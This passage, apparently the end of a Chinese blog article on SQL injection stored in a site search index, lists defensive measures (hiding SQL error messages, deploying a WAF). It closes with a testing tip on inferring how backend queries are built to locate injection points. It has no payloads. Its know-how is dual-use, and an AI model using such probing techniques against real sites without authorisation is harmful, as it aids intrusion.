title="其他层面"></a>其他层面</h2><ol><li>网站应避免抛出SQL语句执行过程中的错误信息，如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断；</li><li>使用通用防注入系统，或部署WAF等。</li></ol><h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><ol><li>在测试SQL注入的时候，一定要思考后端的SQL语句是如何构造的，只有判断除后端SQL语句的大致构造情况，才能知道我们可控注入点的位置，可能是<code>select sqli</code>、<code>where id=</code> 、<code>order by sqli</code>，这样才好对症下药。</li></ol><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
